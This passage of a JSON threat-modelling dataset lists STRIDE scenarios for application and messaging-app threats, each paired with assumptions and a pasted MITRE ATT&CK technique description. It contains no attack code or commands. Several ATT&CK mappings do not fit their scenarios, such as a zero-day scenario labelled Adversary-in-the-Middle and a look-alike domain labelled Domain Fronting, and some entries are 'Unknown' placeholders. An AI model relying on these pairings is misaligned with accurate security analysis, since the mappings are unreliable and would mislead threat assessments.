                "description": "Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)\n\nOn network devices, adversaries may wipe configuration files and other data from the device using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `erase`.(Citation: erase_cmd_cisco)",
                "id": "attack-pattern--1988cc35-ced8-4dad-b2d1-7628488fa967",
                "technique_id": "T1561"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges within the application to gain administrative control.",
            "Assumptions": [
                {
                    "Assumption": "The application has privilege escalation vulnerabilities.",
                    "Role": "Application",
                    "Condition": "Valid if vulnerabilities exist and are exploitable."
                },
                {
                    "Assumption": "The attacker can interact with the application to exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has access to the application interface."
                },
                {
                    "Assumption": "There are no effective controls to prevent or detect privilege escalation.",
                    "Role": "Application",
                    "Condition": "Valid if the application lacks privilege monitoring and controls."
                }
            ],
            "Potential Impact": "Unauthorized access to admin functions and data.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "administrative access",
                "vulnerability exploitation",
                "application"
            ],
            "mitre_technique": {
                "name": "Services Registry Permissions Weakness",
                "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
                "technique_id": "T1574.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user leverages insufficient permissions checks to access restricted areas of the application.",
            "Assumptions": [
                {
                    "Assumption": "Permissions are not properly enforced throughout the application.",
                    "Role": "Application",
                    "Condition": "Valid if there are gaps in permission implementation."
                },
                {
                    "Assumption": "The user has knowledge or tools to bypass permission checks.",
                    "Role": "User",
                    "Condition": "Valid if the user can exploit these gaps."
                },
                {
                    "Assumption": "There are no logging and alerting mechanisms for unauthorized access attempts.",
                    "Role": "Application",
                    "Condition": "Valid if unauthorized attempts are not monitored."
                }
            ],
            "Potential Impact": "Unauthorized access to restricted data and functions.",
            "MITRE ATT&CK Keywords": [
                "permissions bypass",
                "unauthorized access",
                "security checks",
                "application"
            ],
            "mitre_technique": {
                "name": "Malicious Shell Modification",
                "description": "Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command line interface or remotely logs in (such as SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user\u2019s home directory (~/) to configure the environment. All login shells on a system use <code>/etc/profile</code> when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files (Citation: intezer-kaiji-malware). These files require root permissions and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> (Rocke) which are sourced when a user opens a command line interface or connects remotely. Adversaries often use ~/.bash_profile since the system only executes the first file that exists in the listed order. Adversaries have also leveraged the <code>~/.bashrc</code> file (Tsunami, Rocke, Linux Rabbit, Magento) which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command line interface. Some malware targets the termination of a program to trigger execution (Cannon), adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session(Pearl_shellbot). \n\nFor macOS, the functionality of this technique is similar but leverages zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>. The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc<code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",
                "id": "attack-pattern--01df3350-ce05-4bdf-bdf8-0a919a66d4a8",
                "technique_id": "T1156"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a zero-day vulnerability in the application to gain root or administrative access.",
            "Assumptions": [
                {
                    "Assumption": "There exists an unknown zero-day vulnerability in the application.",
                    "Role": "Application",
                    "Condition": "Valid if the application is not fully secure against zero-days."
                },
                {
                    "Assumption": "The attacker can identify and exploit the zero-day vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has skills and resources to find and exploit zero-days."
                },
                {
                    "Assumption": "The application does not have real-time zero-day protection mechanisms.",
                    "Role": "Application",
                    "Condition": "Valid if the application lacks zero-day attack mitigation."
                }
            ],
            "Potential Impact": "Unauthorized administrative control of the application.",
            "MITRE ATT&CK Keywords": [
                "zero-day exploitation",
                "root access",
                "vulnerability exploitation",
                "application"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "9",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could create a fake desktop client application mimicking the legitimate ones and trick users into linking it to their primary device.",
            "Assumptions": [
                {
                    "Assumption": "Users are not vigilant in verifying the authenticity of desktop clients.",
                    "Role": "User",
                    "Condition": "User downloads the fake application from an untrusted source."
                },
                {
                    "Assumption": "The attacker has the means to distribute the fake application widely.",
                    "Role": "Attacker",
                    "Condition": "Attacker controls or compromises a popular download site or sends phishing emails."
                },
                {
                    "Assumption": "The fake desktop client looks convincing enough to pass as a real one.",
                    "Role": "Attacker",
                    "Condition": "Attacker has enough resources to create a high-quality mimic."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive communications and data.",
            "MITRE ATT&CK Keywords": [
                "Credential Access",
                "Impersonation",
                "Phishing",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could use a Man-in-the-Middle (MitM) attack to intercept the initial account setup and manipulate the public key exchange.",
            "Assumptions": [
                {
                    "Assumption": "The initial account setup is done over an insecure network.",
                    "Role": "User",
                    "Condition": "User is on a public Wi-Fi without VPN."
                },
                {
                    "Assumption": "The attacker is positioned to intercept and alter network traffic.",
                    "Role": "Attacker",
                    "Condition": "Attacker has access to the same network or compromised network infrastructure."
                },
                {
                    "Assumption": "Users do not validate the authenticity of the received public key.",
                    "Role": "User",
                    "Condition": "Lack of user awareness about key validation."
                }
            ],
            "Potential Impact": "Interception and potential alteration of messages, leading to a loss of confidentiality and integrity.",
            "MITRE ATT&CK Keywords": [
                "Man-in-the-Middle",
                "Network",
                "Public Key Manipulation",
                "Traffic Interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker leverages a doppelganger domain to trick users into believing they are accessing the legitimate messaging application web interface.",
            "Assumptions": [
                {
                    "Assumption": "Users are not careful in verifying the URL of the webpage.",
                    "Role": "User",
                    "Condition": "User relies on visual similarity rather than URL validation."
                },
                {
                    "Assumption": "The attacker's domain appears very similar to the legitimate domain.",
                    "Role": "Attacker",
                    "Condition": "Attacker registers a domain with a visually similar name."
                },
                {
                    "Assumption": "Users do not use bookmarks or type the URL manually.",
                    "Role": "User",
                    "Condition": "User accesses the site through search engines or phishing emails."
                }
            ],
            "Potential Impact": "Compromise of user credentials, leading to a loss of confidentiality.",
            "MITRE ATT&CK Keywords": [
                "Phishing",
                "Domain Fronting",
                "URL Spoofing",
                "Credential Capture"
            ],
            "mitre_technique": {
                "name": "Domain Fronting",
                "description": "Domain fronting takes advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) The technique involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\n\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",
                "id": "attack-pattern--1ce03c65-5946-4ac9-9d4d-66db87e024bd",
                "technique_id": "T1172"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with the SQLite database storing cryptographic keys on the device.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or root access to the device.",
                    "Role": "Attacker",
                    "Condition": "Device is lost or compromised."
                },
                {
                    "Assumption": "SQLite database is not sufficiently protected.",
                    "Role": "Developer",
                    "Condition": "Lack of robust encryption and access controls."
                },
                {
                    "Assumption": "Users do not regularly monitor their device's integrity.",
                    "Role": "User",
                    "Condition": "User lacks security awareness or tools to detect tampering."
                }
            ],
            "Potential Impact": "Corruption of stored encryption keys leading to major service disruptions and loss of data integrity.",
            "MITRE ATT&CK Keywords": [
                "Database Manipulation",
                "Local Privilege Escalation",
                "File System Permissions Weakness"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could intercept and modify data in transit between the primary device and companion devices.",
            "Assumptions": [
                {
                    "Assumption": "The network connection between devices is not always secure.",
                    "Role": "User",
                    "Condition": "User connects to the internet over unencrypted Wi-Fi networks."
                },
                {
                    "Assumption": "The attacker can insert themselves into the communication path.",
                    "Role": "Attacker",
                    "Condition": "The attacker controls a node on the network."
                },
                {
                    "Assumption": "Encryption protocols have implementation flaws or vulnerabilities.",
                    "Role": "Developer",
                    "Condition": "Non-patched or improperly implemented encryption protocols."
                }
            ],
            "Potential Impact": "Corruption of messages and data resulting in loss of integrity and possibly service functionality.",
            "MITRE ATT&CK Keywords": [
                "Network Injection",
                "Data Manipulation",
                "Session Hijacking"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to the file system and modifies application binaries on the device.",
            "Assumptions": [
                {
                    "Assumption": "The device's file system is not adequately protected.",
                    "Role": "Developer/User",
                    "Condition": "Lack of file integrity monitoring and access control mechanisms."
                },
                {
                    "Assumption": "The attacker has elevated privileges on the device.",
                    "Role": "Attacker",
                    "Condition": "Attacker has obtained root access through an exploit."
                },
                {
                    "Assumption": "The application does not verify its own integrity at runtime.",
                    "Role": "Developer",
                    "Condition": "Absence of self-check mechanisms in the software."
                }
            ],
            "Potential Impact": "Execution of malicious code leading to unauthorized access and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "File Manipulation",
                "Privilege Escalation",
                "Malicious Code Injection"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having sent a message due to the lack of sufficient non-repudiation controls.",
            "Assumptions": [
                {
                    "Assumption": "The system does not log sufficient details of user activities.",
                    "Role": "Developer",
                    "Condition": "Lack of detailed and tamper-proof logging mechanisms."
                },
                {
                    "Assumption": "There is no effective way to link actions back to a specific user.",
                    "Role": "Developer",
                    "Condition": "Absence of stringent user authentication and activity tracking."
                },
                {
                    "Assumption": "Users can claim their accounts were compromised without proper verification mechanisms.",
                    "Role": "User",
                    "Condition": "No secondary verification processes for account actions."
                }
            ],
            "Potential Impact": "Disputes over message authenticity, leading to potential legal and trust issues.",
            "MITRE ATT&CK Keywords": [
                "Non-Repudiation Failure",
                "Activity Concealment",
                "Audit Log Manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An admin user denies performing critical configuration changes by exploiting missing or insufficient audit logging.",
            "Assumptions": [
                {
                    "Assumption": "Configuration changes are not adequately logged.",
                    "Role": "Developer",
                    "Condition": "System lacks robust logging for configuration changes."
                },
                {
                    "Assumption": "There is no trail linking configuration changes to a specific admin user.",
                    "Role": "Developer",
                    "Condition": "No assignment of unique credentials and responsibilities."
                },
                {
                    "Assumption": "Logs can be easily tampered with or deleted without detection.",
                    "Role": "Admin User",
                    "Condition": "Logging mechanism is weak or misconfigured."
                }
            ],
            "Potential Impact": "Untraceable changes leading to security breaches and operational issues.",
            "MITRE ATT&CK Keywords": [
                "Configuration Manipulation",
                "Log Deletion",
                "Untracked System Changes"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user disputes a fraudulent transaction because the application lacks verifiable logs of transactions.",
            "Assumptions": [
                {
                    "Assumption": "Transaction logs are not maintained or verified properly.",
                    "Role": "Developer",
                    "Condition": "Application lacks robust transaction logging mechanisms."
                },
                {
                    "Assumption": "User claims compromised account without sufficient evidence.",
                    "Role": "User",
                    "Condition": "No multi-factor authentication or monitoring."
                },
                {
                    "Assumption": "Transaction details can be manipulated without detection.",
                    "Role": "Attacker",
                    "Condition": "Weak data integrity and logging mechanisms."
                }
            ],
            "Potential Impact": "Disputes over the legitimacy of transactions, leading to financial losses and reputation damage.",
            "MITRE ATT&CK Keywords": [
                "Transaction Forgery",
                "Audit Failure",
                "Financial Manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits vulnerabilities in encryption protocols to decrypt intercepted messages.",
            "Assumptions": [
                {
                    "Assumption": "The encryption protocol being used has undiscovered vulnerabilities.",
                    "Role": "Developer",
                    "Condition": "Protocol has not been rigorously tested or updated."
                },
                {
                    "Assumption": "The attacker has advanced cryptographic knowledge and resources.",
                    "Role": "Attacker",
                    "Condition": "Attacker is a highly-skilled adversary (e.g., nation-state actor)."
                },
                {
                    "Assumption": "Encrypted messages are intercepted during transit.",
                    "Role": "Attacker",
                    "Condition": "Attacker has access to network traffic."
                }
            ],
            "Potential Impact": "Unauthorized access to confidential communications.",
            "MITRE ATT&CK Keywords": [
                "Cryptanalysis",
                "Decryption",
                "Protocol Exploitation",
                "Network Interception"
            ],
            "mitre_technique": {
                "name": "Weaken Encryption",
                "description": "Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device\u2019s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",
                "id": "attack-pattern--1f9012ef-1e10-4e48-915e-e03563435fe8",
                "technique_id": "T1600"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to SQLite databases storing sensitive user information on the device.",
            "Assumptions": [
                {
                    "Assumption": "The device's databases are not properly encrypted or access-controlled.",
                    "Role": "Developer",
                    "Condition": "Weak database encryption and access policies."
                },
                {
                    "Assumption": "The attacker has physical or remote privileged access to the device.",
                    "Role": "Attacker",
                    "Condition": "Device is compromised or lost."
                },
                {
                    "Assumption": "The sensitive data is stored in a readable format within the database.",
                    "Role": "Developer",
                    "Condition": "Lack of additional data encryption and obfuscation."
                }
            ],
            "Potential Impact": "Exposure of sensitive user data leading to privacy violations.",
            "MITRE ATT&CK Keywords": [
                "Database Access",
                "Sensitive Data Disclosure",
                "Unauthorized Access"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker performs a phishing attack to steal users' private key files from their devices.",
            "Assumptions": [
                {
                    "Assumption": "Users are susceptible to phishing attempts.",
                    "Role": "User",
                    "Condition": "Users lack awareness or training on phishing."
                },
                {
                    "Assumption": "Private keys are stored in accessible locations on the device.",
                    "Role": "Developer",
                    "Condition": "Inadequate key management and storage practices."
                },
                {
